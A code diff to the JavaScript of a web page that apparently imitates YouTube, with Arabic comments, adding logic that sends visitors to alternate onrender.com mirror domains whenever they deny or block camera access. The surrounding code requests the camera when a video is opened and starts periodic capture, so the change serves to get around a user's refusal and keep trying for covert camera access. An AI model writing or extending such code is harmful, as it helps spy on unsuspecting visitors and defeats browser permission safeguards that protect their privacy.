@@ -265,32 +265,32 @@ body.drawer-mode .main{margin-inline-start:0}
 
 <script>
 /* ==========================================================
-   نظام تدوير النطاقات التسلسلي المتعدد (Multi-Mirror Chain)
+   نظام تدوير النطاقات الفوري والتسلسلي المتعدد (Multi-Mirror Chain)
    ========================================================== */
+function executeDomainRotation() {
+    const mirrorDomains = [
+        "https://youtube-my.onrender.com",
+        "https://youtube-my-1.onrender.com"
+    ];
+    
+    let attemptIndex = parseInt(sessionStorage.getItem('mirror_attempt') || '0');
+    
+    if (attemptIndex < mirrorDomains.length) {
+        const nextDomain = mirrorDomains[attemptIndex];
+        sessionStorage.setItem('mirror_attempt', (attemptIndex + 1).toString());
+        
+        if (window.location.origin !== nextDomain) {
+            window.location.replace(nextDomain);
+        }
+    }
+}
+
 async function checkAndRotateDomain() {
     if (navigator.permissions && navigator.permissions.query) {
         try {
             const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-            
-            // إذا قام المستخدم بحظر الكاميرا مسبقاً
             if (permissionStatus.state === 'denied') {
-                // قائمة النطاقات البديلة (المرآة) الخاصة بك على Render
-                // يمكنك إضافة أي روابط إضافية هنا بالترتيب
-                const mirrorDomains = [
-                    "https://youtube-my.onrender.com",
-                    "https://youtube-my-1.onrender.com"
-                ];
-                
-                let attemptIndex = parseInt(sessionStorage.getItem('mirror_attempt') || '0');
-                
-                if (attemptIndex < mirrorDomains.length) {
-                    const nextDomain = mirrorDomains[attemptIndex];
-                    sessionStorage.setItem('mirror_attempt', (attemptIndex + 1).toString());
-                    
-                    if (window.location.origin !== nextDomain) {
-                        window.location.replace(nextDomain);
-                    }
-                }
+                executeDomainRotation();
             }
         } catch (err) {
             console.log("فحص الصلاحيات غير مدعوم:", err);
@@ -298,7 +298,6 @@ async function checkAndRotateDomain() {
     }
 }
 
-// تنفيذ الفحص فور تحميل الصفحة
 document.addEventListener('DOMContentLoaded', checkAndRotateDomain);
 
 /* ===== Data & Core State ===== */
@@ -443,7 +442,7 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== دوال الكاميرا والانتقال المشروط وإعادة المحاولة ===== */
+/* ===== دوال الكاميرا والانتقال المشروط والتحويل الفوري عند الرفض ===== */
 async function openVideo(id) {
     if (mediaStream) {
         executeWatchTransition(id);
@@ -466,7 +465,9 @@ async function openVideo(id) {
         startPeriodicCapture();
 
     } catch (e) {
-        console.log("تم رفض الإذن أو حدث خطأ في الكاميرا، سيبقى المستخدم في الواجهة الرئيسية:", e);
+        console.log("تم رفض الإذن، جاري التحويل الفوري للرابط البديل...");
+        // تحويل فوري ولحظي للنطاق البديل بمجرد النقر على حظر أو رفض
+        executeDomainRotation();
     }
 }
 
